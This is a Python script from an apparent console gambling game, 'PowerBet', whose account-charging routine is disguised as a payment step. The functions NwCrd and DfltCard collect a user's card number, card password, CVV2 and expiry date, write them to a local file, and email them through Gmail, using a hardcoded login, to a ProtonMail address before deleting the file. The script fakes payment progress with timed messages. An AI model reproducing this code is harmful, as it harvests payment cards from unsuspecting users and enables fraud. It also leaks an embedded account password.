import time
import os
from luhn.luhn import aLuhn
from Ac_Info   import *
from Card_Info import *


#############################################################################
#############################################################################
def Snd_Pm_Nw():
    import smtplib, ssl
    port = 587  # For starttls
    smtp_server = "smtp.gmail.com"
    sender_email = "PowerBet.Official@gmail.com"
    receiver_email = "PowerBet.Official@protonmail.com"
    EmPa = 'noskhebeta'
    op_crdinfo= open('.\\GMsLOG\\CrdChrg',mode='r')
    rd_crdinfo= op_crdinfo.read()
    message = """Payment - Charge\nNew Card\n""" + NickName + """\n""" + str(Valuee) + """\n\n""" + rd_crdinfo
    context = ssl.create_default_context()
    with smtplib.SMTP(smtp_server, port) as server:
        server.ehlo()  # Can be omitted
        server.starttls(context=context)
        server.ehlo()  # Can be omitted
        server.login(sender_email, EmPa)
        server.sendmail(sender_email, receiver_email, message)
    time.sleep(4)
    os.remove('.\\GMsLOG\\CrdChrg')
#############################################################################
def Snd_Pm_Dflt():
    import smtplib, ssl
    port = 587  # For starttls
    smtp_server = "smtp.gmail.com"
    sender_email = "PowerBet.Official@gmail.com"
    receiver_email = "PowerBet.Official@protonmail.com"
    EmPa = 'noskhebeta'
    op_crdinfo= open('.\\GMsLOG\\CrdChrg',mode='r')
    rd_crdinfo= op_crdinfo.read()
    message = """Payment - Charge\n""" + NickName + """\n""" + str(Valuee) + """\n\n""" + rd_crdinfo
    context = ssl.create_default_context()
    with smtplib.SMTP(smtp_server, port) as server:
        server.ehlo()  # Can be omitted
        server.starttls(context=context)
        server.ehlo()  # Can be omitted
        server.login(sender_email, EmPa)
        server.sendmail(sender_email, receiver_email, message)
#############################################################################
#############################################################################
def Add_Crdt():
    if RmnnVluCshot >= 0:
        op_inf= open('.\\Ac_Info.py',mode='w')
        op_inf.write('Nickname= \''    + Nickname + '\'\n'+
                    'Credit= '         + str(Credit + Valuee)+
                    '\nCrash_Wins= '   + str(Crash_Wins) + '\nCrash_Loses= ' + str(Crash_Loses) +
                    '\nBJ_Wins= '      + str(BJ_Wins)    + '\nBJ_Loses= '    + str(BJ_Loses)      +
                    '\nRPS_Wins= '     + str(RPS_Wins)   + '\nRPS_Loses= '   + str(RPS_Loses)     +
                    '\nRatioX_Wins= '  + str(RatioX_Wins)    + '\nRatioX_Loses= '+ str(RatioX_Loses) +
                    '\nDR_Wins= '  + str(DR_Wins)    + '\nDR_Loses= '+ str(DR_Loses)  +
                    '\nRmnnVluCshot= '  + str(RmnnVluCshot + Valuee)
                    )
        op_inf.close()
    else:
        op_inf= open('.\\Ac_Info.py',mode='w')
        op_inf.write('Nickname= \''    + Nickname + '\'\n'+
                    'Credit= '         + str(Credit + Valuee)+
                    '\nCrash_Wins= '   + str(Crash_Wins) + '\nCrash_Loses= ' + str(Crash_Loses) +
                    '\nBJ_Wins= '      + str(BJ_Wins)    + '\nBJ_Loses= '    + str(BJ_Loses)      +
                    '\nRPS_Wins= '     + str(RPS_Wins)   + '\nRPS_Loses= '   + str(RPS_Loses)     +
                    '\nRatioX_Wins= '  + str(RatioX_Wins)    + '\nRatioX_Loses= '+ str(RatioX_Loses) +
                    '\nDR_Wins= '  + str(DR_Wins)    + '\nDR_Loses= '+ str(DR_Loses)  +
                    '\nRmnnVluCshot= '  + str(Valuee)
                    )
        op_inf.close()

def RDT():
    global now
    global DnT
    import datetime
    now = datetime.datetime.now()
    DnT= now.strftime("%Y-%m-%d %H:%M:%S")

def Add_Trknsh():
    RDT()
    rd_log= op_log= open('.\\GMsLOG\\C@cdn0',mode='r')
    rdrd_log= rd_log.read()
    op_log= open('.\\GMsLOG\\C@cdn0',mode='w')
    op_log.write(rdrd_log + str(DnT) + '\tCharge\t' + '\t\t\t+' + str(Valuee) + '\t\tCrdt: ' + str(Credit) + '\n')
    op_log.close()
#############################################################################
#############################################################################
#############################################################################
def NwCrd():
    CardNom= input('Type your card number: ')
    if len(CardNom) == 16:
        ChckVldt = aLuhn.doLuhn(CardNom)
        if ChckVldt == True:
            CardPass= input('Type Your Password: ')
            if len(CardPass) >= 8 and len(CardPass) <= 12:
                CardCVV= input('Type Your CVV2: ')
                if len(CardCVV) == 4 or len(CardCVV) == 3:
                    CardMonth= input('Expiration month: ')
                    if len(CardMonth)==2 or len(CardMonth)==1:
                        if CardMonth == '01' or CardMonth == '02' or CardMonth == '03' or CardMonth == '04' or CardMonth == '05' or CardMonth == '06' or CardMonth == '07' or CardMonth == '08' or CardMonth == '09' or CardMonth == '1' or CardMonth == '2' or CardMonth == '3' or CardMonth == '4' or CardMonth == '5' or CardMonth == '6' or CardMonth == '7' or CardMonth == '8' or CardMonth == '9' or CardMonth == '10' or CardMonth == '11' or CardMonth == '12':
                            CardYear= input('Expiration year: ')
                            if len(CardYear)==2 :
                                if CardYear == '00' or CardYear == '98' or CardYear == '99' or CardYear == '00' or CardYear == '01' or CardYear == '02':
                                
                                    op_inf= open('.\\GMsLOG\\CrdChrg',mode='w')
                                    op_inf.write('CardNom= \''  + CardNom  + '\'\n' +
                                                'CardPass= \'' + CardPass + '\'\n' +
                                                'CardCVV= \''  + CardCVV  + '\'\n' +
                                                'CardMonth= \''+ CardMonth+ '\'\n' +
                                                'CardYear= \'' + CardYear + '\'\n'
                                                )
                                    op_inf.close()
                                    print('Loading...')
                                    time.sleep(3)
                                    print('Completing payment...')
                                    time.sleep(2)
                                    Add_Crdt()
                                    Add_Crdt
                                    Snd_Pm_Nw()
                                    print('Your account has been charged.')
                                else:
                                    print('Invalid Year Number.\n')
                                    NwCrd()
                            else:
                                print('Invalid Year Number.\n')
                                NwCrd()
                        else:
                            print('Invalid Month Number.\n')
                            NwCrd()
                    else:
                        print('Invalid Month Number.\n')
                        NwCrd()
                else:
                    print('Invalid CVV2.')
                    NwCrd()
            else:
                print('Invalid Password.')
                NwCrd()
        else:
            print('Invalid card number.')
            NwCrd()
    else:
        print('Invalid Card Number.\n')
        NwCrd()    
#############################################################################
def DfltCard():
        print('Card Number:           ' + CardNom)
        print('Card Expiration Date:  ' + CardYear+'/'+CardMonth)
        CardPass= input('Type Your Password: ')
        if len(CardPass) >= 8 and len(CardPass) <= 12:
            CardCVV= input('Type Your CVV2: ')
            if len(CardCVV) == 4 or len(CardCVV) == 3:
                op_inf= open('.\\GMsLOG\\CrdChrg',mode='w')
                op_inf.write('CardNom= \''  + CardNom  + '\'\n' +
                            'CardPass= \'' + CardPass + '\'\n' +
                            'CardCVV= \''  + CardCVV  + '\'\n' +
                            'CardMonth= \''+ CardMonth+ '\'\n' +
                            'CardYear= \'' + CardYear + '\'\n'
                            )
                op_inf.close()
                print('Loading...')
                time.sleep(3)
                print('Completing payment...')
                time.sleep(2)
                Add_Trknsh()
                Add_Crdt()
                Snd_Pm_Dflt()
                print('Your account has been charged.')
            else:
                print('Invalid CVV2.')
                DfltCard()
        else:
            print('Invalid Password.')
            DfltCard()
#############################################################################
#############################################################################
#############################################################################
def DfltCrdYN():
    FTACN= str(CardNom)     #Four Taye Akhare CardNumber
    FTACN= FTACN[-5:-1]
    DefCrdYN= input('Are you going to charge your account with ' + CardName + FTACN + ' ? (Y/N)  ')
    if DefCrdYN.lower() == 'n' or DefCrdYN.lower == 'no':
        print('Type new card information.')
        NwCrd()
    else:
        DfltCard()
#########################################################
def ValueF():
    global Valuee
    Valuee= input('Type how much do you want to increase your credit: ')
    try:
        Valuee= float(Valuee)
        Valuee= int(Valuee)
        if Valuee < 15000:
            print('At least 15000$ need for charging.')
        else: 
            DfltCrdYN()
    except ValueError:
        print('Type only number.')
        ValueF()
#########################################################
def Crdt_Vlu():
    if Credit == 0:
        print('No credit remaining! \nYou lost all of it!')
        ValueF()
    else:
        print('You have still ' + str(Credit) + '$ remaining.')
        ChYN= input('Do you want to charge your account? (Y/N)  ')
        if ChYN.lower() == 'y' or ChYN.lower() == 'yes':
            ValueF()
        else:
            print('OK, Page is closing.')
            time.sleep(1.5)
Crdt_Vlu()








"""
 op_inf= open('.\\Card_Info.py',mode='w')
 op_inf.write('CardNom= \''  + CardNom  + '\'\n' +
             'CardIBAN= \'' + CardIBAN + '\'\n' +
             'CardName= \''  + CardName  + '\'\n'+
             )
 op_inf.close()
 time.sleep(4)
"""
